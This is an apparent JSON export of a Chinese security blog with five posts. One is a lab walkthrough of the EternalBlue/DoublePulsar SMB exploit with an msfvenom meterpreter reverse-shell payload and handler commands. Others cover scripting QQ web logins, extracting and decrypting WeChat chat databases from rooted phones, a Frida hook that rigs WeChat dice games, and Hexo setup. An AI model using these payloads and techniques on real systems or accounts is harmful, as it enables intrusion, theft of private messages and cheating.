[{"title":"方程式漏洞利用之SMB","date":"2017-04-15T13:01:45.000Z","path":"2017/04/15/方程式漏洞利用之SMB/","text":"测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法 环境搭建 主机 IP 备注 Win7 64位 192.168.232.133 靶机（开启smb） XP 192.168.232.128 攻击机1 Kali 192.168.232.134 攻击机2 攻击机软件安装1.下载https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows2.安装Python2.6 32位 安装后，运行fb.py，发现错误ImportError: No module named win32pipe 搜索后提示需要安装pywin32-216.win32-py2.6.exe，下载地址https://sourceforge.net/projects/pywin32/files%2Fpywin32/选择对应的版本。结果又发现错误 切换到Python的安装目录的Scripts下，执行命令pywin32_postinstall.py -install 运行fb.py报错，在fb.py同目录下创建listeningposts文件夹即可 验证过程运行fb.py后输入靶机和攻击机XP的IP，新建或者用之前的项目之后一路回车，需要操作的地方已经标记选择SMB工具模块，使用命令use Eternalblue选择目标系统输入命令use Doublepulsar 在Kali上生成dll文件，命令如下1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.134 LPORT=5555 -f dll &gt; s.dll 然后copy到XP系统中，记下位置，如C:\\s.dllkali上运行msf，具体命令如下12345678msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set LHOST 192.168.232.134LHOST =&gt; 192.168.232.134msf exploit(handler) &gt; set LPORT 5555LPORT =&gt; 5555msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; exploit 在XP上输入dll文件的位置，一路回车显示Doublepulsar Succeeded 查看kali上发现已经反弹shell 了 结束语现在网上已经有很多文章了，这里只是自己验证一下实现的过程，记录一下。其实复现也很容易，只需要输入IP地址和一些选项即可，就是搭建环境的时候有许多错误，注意一下就行了。这里有视频可以看一下https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0","tags":[{"name":"方程式","slug":"方程式","permalink":"https://fupinglee.github.io/tags/方程式/"},{"name":"SMB漏洞","slug":"SMB漏洞","permalink":"https://fupinglee.github.io/tags/SMB漏洞/"}]},{"title":"QQ登录简单分析，附易语言登录代码","date":"2017-04-10T13:58:29.000Z","path":"2017/04/10/QQ登录简单分析，附易语言登录代码/","text":"这里参考了QQ登录的组件1http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm QQ登录有两种情况，一种是需要验证码，一种是不需要验证码。需要验证码的稍微复杂一点，这里首先介绍一下不需要验证码的情况。 一、无需验证码第一步：获取 login_sig这是登录所需要的第一步，无论是否需要验证码，都需要进行这一步。访问如下地址：1http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm 从返回的Cookie中获取 pt_login_sig的值，这个值就是login_sig 第二步：获取 checkVC这个字符串中包含了多个内容。有是否输入验证码的标志、verifycode、salt和pt_verifysession_v1（不需要输入验证码的情况下）。请求地址： 1http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=QQ号码&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKS********T0U0npqlnD4bzXEMed&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.23528769960244944&amp;pt_uistyle=40 其中参数uin是登录的qq号码，login_sig是从第一步获取的值。当然这种情况是在QQ号输入正确，并且不需要输入验证码时。返回的内容如下：1ptui_checkVC(&apos;0&apos;,&apos;!BAF&apos;,&apos;\\x00******\\x64\\x21\\x97\\x92&apos;,&apos;e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&apos;,&apos;2&apos;); 第一个值表示是否需要图片验证码，0表示不需要 第二值是verifycode，登录时需要 第三个值是salt，QQ转换而来 第四个值是pt_verifysession_v1 第三步：登录输入密码后点登录，请求包为：1http://ptlogin2.qq.com/login?u=QQ号码&amp;verifycode=!BAF&amp;pt_vcode_v1=0&amp;pt_verifysession_v1=e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&amp;p=w79Tqqx2glOF9meNNWhz5Ouow23EGt3zEl-y8vpVGFuHT6HJaFtRhVDlbpMj4a6plyrnIvW73uGXzVDwSt2e9wMHyFt9crtZ-N0xUx2wxFUen03ybw5HxzkPti3VyjSffID8GNkhDn1yYVPa1lyjHED2DCVd3rl9bysBPb*1imLSYY3jkQJpsXPS2kjxxlVxFBVHEHnSGSYaA3QBMXQ*NyQw7MkhVDsO7X8aljR0eApa*lgHoBsC4g3mTtEKcU5aslpcO4EPdUey0QA4YVh9zLzbLnkPJklcQYvoxlv6kLdYmoyORcVTM6IKqles7t5ot0mRWzjW923hV3X0PLRb6g__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=4-8-1488010172151&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKSrRZ7ek0VU5-63oyUvqLk65vxoIG0kOFBT0U0npqlnD4bzXEMed&amp;pt_uistyle=40&amp;aid=636014201&amp; 参数名称 说明 u 用户输入。第二步骤中 uin的值 verifycode 第二步中ptui_checkVC第二个值。(这里的是!BAF) pt_verifysession_v1 第二步中ptui_checkVC第四个值。即e9825f1…. p 加密后的密码 login_sig 第一步中返回Cookie中的 pt_login_sig值 pt_randsalt pt_randsalt=0 旧版加密 ；pt_randsalt=2 新版RSA加密 密码加密的js代码地址http://imgcache.qq.com/ptlogin/ver/10197/js/c_login_2.js，注意看js版本，这里是js_ver为10197 密码加密需要三个参数，第一个是pwd（用户密码），第二个是salt（第二步中获取ptui_checkVC 中的第三个值），第三个是verifycode（第二步中ptui_checkVC第二个值 ） 用户名密码正确返回：1ptuiCB(&apos;0&apos;,&apos;0&apos;,&apos;http://www.qq.com/qq2012/loginSuccess.htm&apos;,&apos;0&apos;,&apos;登录成功！&apos;, &apos;QQ昵称&apos;); 用户名密码错误返回： 1ptuiCB(&apos;3&apos;,&apos;0&apos;,&apos;&apos;,&apos;0&apos;,&apos;您输入的帐号或密码不正确，请重新输入。&apos;, &apos;&apos;); 附上一张登录成功的截图 二、需要输入验证码第一步：获取login_sig与上面无需验证码一样，就省略了。 第二步：获取cap_cd请求：1http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=987654321&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.8539291708517738&amp;pt_uistyle=40 返回1ptui_checkVC(&apos;1&apos;,&apos;yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&apos;,&apos;\\x00\\x00\\x00\\x00\\x3a\\xde\\x68\\xb1&apos;,&apos;&apos;,&apos;2&apos;); cap_cd的值为yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w** 第三步：获取sess请求：1http://captcha.qq.com/cap_union_new_gettype?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;callback=_aq_453849 uid是qq号，cap_cd由第二步获取 返回：1_aq_453849(&#123;&quot;capclass&quot;:&quot;0&quot;,&quot;subcapclass&quot;:&quot;0&quot;,&quot;src&quot;:&quot;cap_union_new_show&quot;,&quot;sess&quot;:&quot;XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&quot;&#125;) 第四步：获取visg请求：1http://captcha.qq.com/cap_union_new_show?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999 第五步：获取图片验证码访问地址：1http://captcha.qq.com/cap_union_new_getcapbysig?aid=549000912&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=” ＋ sess ＋ “&amp;noBorder=noborder&amp;showtype=embed&amp;uid=” ＋ uin ＋ “&amp;cap_cd=” ＋ cap_cd ＋ “&amp;lang=2052&amp;rnd=117715&amp;rand=0.5497459754332915&amp;vsig=” ＋ vsig ＋ “&amp;ischartype=1 第六步：验证验证码，获取verifycode和pt_verifysession_v1post请求：http://captcha.qq.com/cap_union_new_verify?random=1488013134675 提交内容：1aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=QQ号码&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999&amp;subcapclass=0&amp;vsig=g3GflfnCicbaqub3e-SVo2azImuo1gDzQfnGkRnhI-uqLlIXtY6XyXE1dDjUBJHOXCPewnnTo-4mPTtRjScTD9uZaPu4z3x1Jj6inepPQ8l8KCeFeN9laBpiWdqaOF4Eg&amp;cdata=0&amp;collect=OD6q9t0AraWJf%2Bdtq0j8VvuOrjmT8T%2F%2FW8E83RE208unUG0TO1T5psMsZH1p5SXS12WpjU2CcGKHMsp7fciMTLiLY3wUwJBjBxWSqfu%2FbhfCTKUtJdBPeE6P%2FsRfdwemWRYRQwRgdvXZuc42JOqfDIfD%2F2%2B2GeYYxOPohbqY%2BWcW%2Fcut%2BGLcKpJGFTzBtPzKDLU6fTPn6MC%2FNiRGWGehwTy52MK0dIVdd5BYlPQrhFrvrhaisRISHiH%2FhViF7iFpZm5ZclBD5rjqQ4r1O8%2BBDRSB4feMaP2S1Usd0uGrMnVFT8zX7dV7sT2Y1NQ%2Fk5%2FHP%2BgzBQgHMLuH%2FqdSBz%2Fu9wr7oT6Xb0edOUBjPrw55yhZM1R%2FxEJSNwap2f77XRxbJWH%2BFtEuWBC2Gve3MIn9L9loCqk%2Fe0XoGGy%2FuEDvHfEHRCchzaWKH3Hlr5MehOI4WaaPgmbj%2BBeSbcY%2BmDIc1TJ%2BhQmsRf5DoqlqiCuKNQLuX1XS1e3cnfM3%2BonkBImxaqx%2BlTG0HxWAV0Ntsn%2B0%2BeErZleVNI9VIZgIOHDxNkiaG3BucPL1SRuPNtgcNgGFpvYmFqTqPrR%2FgYDPobzlxy%2FcMVEALYB%2FogbH4gy%2FZP7xczjXypgdvtTawokxTUopmKyXVCwvA0coEQzWLW1EQfMsWPNZcA2p58oaelGA3FBlgkZ2iUnx4qukKEZQ7vKFie8VKFBelfNSp6aXcezYbnDbeFHYOAvLeXPriaZ5qBQzNADUtyj%2FhTsY%2BbvmnwCAGT%2F%2BMYeyd9VFWPEbR8cj%2FrRDEEWc0wdd5BOoHzix%2Bz2Uif9512VwHn9%2Bp3KXAnrK1O%2FQ6HRB7YS9BPyYQvW9ZtpvvKBwOIjf3fx7aqwYqfa7VUzMGv3zkvVA8Bp2JHG2GoQxnVa62ymP3SGshxS4l86ParjFNvepN16O1VaPAidFvqHRXAP14tHMkeC8VTFuqp5cKAY4UdXpPXukOvXPySbdFSPaaAqfIv7%2BckjxFsUPS4cauOx2jif2fQU2maxErLnwrZ10natNklynu5sUn9RSuRDld9v4TNTbyPShDdijM%2BzvpJoMyr4GWiFthB0kZZ2lVnPoqV67VQ%2FPiyCUA9zVbrLSAEOKIz1HQ19I0hdH41fBUPL824xYMdIO1AlZJKGre%2FCvUEgXaHgvbe83QNtFw%2BU946tlGVwR9TCCPltakqyKrT%2F8CtCZ6Mi0qfmFYnF8D7zZBaKxbNgTmMjvwAyz%2F0dMsDi97scJLMYV4w%2Fosk6gvoHEeX6LkbXh5W0aTYTznTSfO2RVfgzWpPiks6rVGzLhfwDyFAyH7%2FOHD7qEWGjnX3fTiBnw5%2FHWqHPJh3Kd%2F4EGe1yE3ZGzxo%2BPETGbcLQaQiiSAaQiFsU5UDoWG1%2FfOjd1Lkjg8D%2FNXuS1BkncxI2Hk%2B4xL0Xa1STqWJGieeyB5DOT9cHYUxEpw1g%3D&amp;ans=ywhm 验证码输入正确返回： 1&#123;\"errorCode\":\"0\" , \"randstr\" : \"@mDo\" , \"ticket\" : \"t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*\" , \"errMessage\":\"OK\"&#125; verifycode为randstr，pt_verifysession_v1为ticket 第七步： 验证用户名密码是否正确请求： 1http://ptlogin2.qq.com/login?u=987654321&amp;verifycode=@mDo&amp;pt_vcode_v1=1&amp;pt_verifysession_v1=t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*&amp;p=A*CEx2PsoaZAYQe7D-5dLmTxdorqI9asO37Wugp2KFHzeEqYpMPh9CHPk7DDzZw5UzD4y1in-ZrSoXLx5kJYe1WGZ7sqhg*ZNJ3DtQ65rXR*I5i*dCAQ-h1fFV*u3AdP8IFAAu*borH*xSYbFZDTQ8TjplD2wan2w8MnDfo3h1AyUL*kpt79FqpCfuXnlaSOyTOzkMceEQczxw5DYzmZDetbMeJMYhoqLhQ0WHxbHUafhOEk1EhBDiqXvfETJvCmSMubGN7W*LIF3JPoYFDOgJmmPWqauGvw7C03ehesfIzeNtm-m5R*QX8HyM4dPp*dc3lRUxF2rMuBPn9EVzaqpg__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=5-24-1488013134992&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;pt_uistyle=40&amp;aid=636014201&amp; 带验证码登录可能存在问题，待修改 易语言实现代码","tags":[{"name":"QQ登录","slug":"QQ登录","permalink":"https://fupinglee.github.io/tags/QQ登录/"},{"name":"易语言","slug":"易语言","permalink":"https://fupinglee.github.io/tags/易语言/"}]},{"title":"微信聊天记录读取","date":"2017-04-09T15:21:28.000Z","path":"2017/04/09/微信聊天记录读取/","text":"根据四哥教程来自己动手实现一下如何读取微信的聊天记录。以下操作需要在手机Root的情况下进行。 微信聊天记录保存位置微信聊天记录的数据库文件保存在/data/data/com.tencent.mm/MicroMsg/32位字符串/中，名字为EnMicroMsg.db。 将聊天记录数据库文件导出使用命令：1adb pull /data/data/com.tencent.mm/MicroMsg/32位字符串/EnMicroMsg.db 直接导出提示不存在，因为是权限的问题。使用adb root没反应，只好将文件copy到一个非root权限可以操作的目录，这里采用了/data/local/tmp文件夹。1cp EnMicroMsg.db /data/local/tmp/ 然后导出，执行命令adb pull /data/local/tmp/EnMicroMsg.db 提示权限不足，修改权限后导出。 查看SharedPreferences中保存的UIN的值切换到/data/data/com.tencent.mm/shared_prefs目录，然后执行grep -rn &quot;uin&quot; *来查看保存的UIN的值 读取微信数据库文件内容将手机的IMEI和微信用户UIN值进行拼接后进行md5加密，取小写md5的前七位就是微信数据库的密码。用Navicat读取数据库文件是提示错误：这是因为微信数据库用的是SQLCipher开源库提供的加密解密算法，读取数据库文件需要使用SQLCipher这个软件。打开后输入密码，即可看到聊天内容： 参考资料http://blog.csdn.net/jiangwei0910410003/article/details/52238891","tags":[{"name":"微信聊天记录","slug":"微信聊天记录","permalink":"https://fupinglee.github.io/tags/微信聊天记录/"}]},{"title":"Android HOOK 技术之Frida的初级使用","date":"2017-04-01T11:39:15.000Z","path":"2017/04/01/Android-HOOK-技术之Frida的初级使用/","text":"Frida是一款基于Python + JavaScript 的Hook与调试框架，在Android\\Linux\\Windows等平台均能使用。这里我们以Windows来对Android应用程序进行Hook。Frida的官网地址是：https://www.frida.re。 Windows下Frida的安装 有多种安装方法，这里提供两种，第一种直接使用pip安装，第二种是下载egg文件安装 1.通过pip安装Frida1pip install frida 2.去下载对应平台的egg安装包进行安装下载地址：https://pypi.python.org/pypi/frida当前最新版本为9.1.23，下载对应平台和Python版本的安装包，例如我的系统为Win64，Python为2.7，下载的文件为frida-9.1.23-py2.7-win-amd64.egg。下载后安装即可。 由于网络原因，方法1安装时间太久，这里推荐第二种方法。 安装完成后在Dos窗口输入命令：1frida-ps 出现类似以下的界面表示安装成功。 Android下Frida环境的搭建 要求：一部Root过的手机或模拟器，最好采用4.4 ARM系统。PS：我真机采用的是魅族4的5.1系统，有些功能实现不了，只好用模拟器来完成。模拟器的具体配置如下图所示。 首先需用下载最新的frida-server，下载地址为：http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。下载后将文件上传到手机中，并赋予执行权限。上传到手机使用如下命令：1adb push frida-server /data/local/tmp/ 将frida-server赋予执行权限，命令如下：1234adb shellsucd /data/local/tmp/chmod 777 frida-server 运行Frida-Server1./data/local/tmp/frida-server 执行frida-ps -U可以看到手机上的进程 使用frida-ps -R 也可以，但是需要进行转发。执行adb forward tcp:27042 tcp:27042后执行frida-ps -R也可以看到手机上的进程 至此，准备工作已经做好，现在来进行对Android上的程序进行Hook了。首先以WX的掷骰子和猜拳头为例。这里采用最新版的WX（6.5.7）。其代码如下所示：123456789101112131415161718192021222324252627282930313233# -*- coding: utf-8 -*import frida, sysdef on_message(message, data): if message['type'] == 'send': print(\"[*] &#123;0&#125;\".format(message['payload'])) else: print(message)jscode = \"\"\"Java.perform(function () &#123;var be= Java.use(\"com.tencent.mm.sdk.platformtools.bf\");send(\"start\")be.da.implementation = function()&#123; var type = arguments[0]; send(type);//5表示掷骰子，2表示猜拳头 if(type ==2)&#123; return 1;//表示是石头 &#125;else&#123; return 5;//骰子6点 &#125;&#125;;send(\"end\")&#125;);\"\"\"process = frida.get_usb_device().attach('com.tencent.mm')script = process.create_script(jscode)script.on('message', on_message)print('[*] weixin Start...')script.load()sys.stdin.read() 手机上打开微信后，运行代码。然后点击掷骰子，可以看到都是6点，猜拳头全部是石头。 下面来用一个例子来介绍一下，如何来通过Hook的方法修改原来的内容，以及当出现相同方法名时，如何对该方法进行Hook。其Android的Activity代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.test.fridatest;import android.app.Activity;import android.os.Bundle;import android.util.Log;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity &#123; private Button myButton1; private String TAG = \"fuping\"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); myButton1 = (Button) findViewById(R.id.button1); myButton1.setOnClickListener( new ButtonClick()); &#125; class ButtonClick implements OnClickListener &#123; public void onClick(View v) &#123; switch (v.getId()) &#123; case R.id.button1: int nRet = test(4); String strRet = nRet + \"\"; Toast.makeText(MainActivity.this, strRet,Toast.LENGTH_LONG).show(); Log.i(TAG, \"test(int):\"+ strRet); strRet = test(4,2)+\"\"; Log.i(TAG, \"test(int,int):\"+ strRet); strRet = test(4,\"2\")+\"\"; Log.i(TAG, \"test(int,String):\"+ strRet); strRet = change(4,\"2\")+\"\"; Log.i(TAG, \"change(int,String):\"+ strRet); break; default: break; &#125; &#125; &#125; public int test(int num) &#123; int nRet = num*2; return nRet; &#125; public int test(int num,int b) &#123; int nRet = num*2 + b ; return nRet; &#125; public String test(int num,String b) &#123; String nRet = num*2 + b ; return nRet; &#125; public String change(int num,String b) &#123; String nRet = num*2 + b ; return nRet; &#125; &#125; 首先演示一下对change方法的hook。hook之前change方法输出的结果为82，预期Hook之后输出的结果应该为164。在真机上运行结果如下所示： 发现Hook之后返回的是null，而且报错。（经过多次给手机系统升级或降级，都无法成功，最后之后在模拟器上测试了） 在模拟器上进行Hook后，出现了预期的结果。在对test方法进行hook时，由于有多个test方法，所以在进行Hook时，需要指定是哪个方法。例如对String test(int num,String b)进行hook时，可以使用如下代码12345var TM = Java.use(\"com.test.fridatest.MainActivity\");TM.test.overload(\"int\",\"java.lang.String\").implementation = function (a,b) &#123; send(\"Called - test(int,String):\"+a+\"----\"+b); return this.test.overload(\"int\",\"java.lang.String\").call(this,8,\"3\");&#125;; 附上对test和change同时hook 的结果： 就个人而言，针对Frida和Xposed相比，Frida操作更简单，而且不需要重启手机。但相关资料较少，还是需要慢慢学习。 参考资料 https://www.frida.re/docs/examples/android/ https://www.codemetrix.net/hacking-android-apps-with-frida-1/ http://www.cnblogs.com/konf/p/5998785.html","tags":[{"name":"安卓Hook","slug":"安卓Hook","permalink":"https://fupinglee.github.io/tags/安卓Hook/"},{"name":"Frida","slug":"Frida","permalink":"https://fupinglee.github.io/tags/Frida/"},{"name":"摇骰子","slug":"摇骰子","permalink":"https://fupinglee.github.io/tags/摇骰子/"}]},{"title":"Hello World","date":"2017-03-20T12:18:23.925Z","path":"2017/03/20/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new blog1$ hexo init Create a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment Question运行hexo server，浏览器输入http://localhost:4000 无法访问 产生原因可能是端口占用。 Windows下运行命令netstat -ano | findstr 4000，看是否有有进程占用了4000端口。 这是安装了福昕PDF阅读器的原因，将Foxitprotect.exe进程结束即可。 安装主题1git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 修改hexo根目录下的 _config.yml ： theme: yilia 之后运行12hexo ghexo s 修改头像hexo根目录下source文件夹中新建assets\\img文件夹，将头像文件复制进去修改主题目录中的_config.yml ：avatar: /assets/img/avatar.jpg 添加标签1.添加标签1tag: 标签 2.添加多个标签1tags: [标签1,标签2,标签3] 或者：123tags: - 标签1 - 标签2 文章部分显示使用&lt;!-- more --&gt;标签来隐藏其下面的内容~","tags":[{"name":"教程","slug":"教程","permalink":"https://fupinglee.github.io/tags/教程/"},{"name":"主题","slug":"主题","permalink":"https://fupinglee.github.io/tags/主题/"}]}]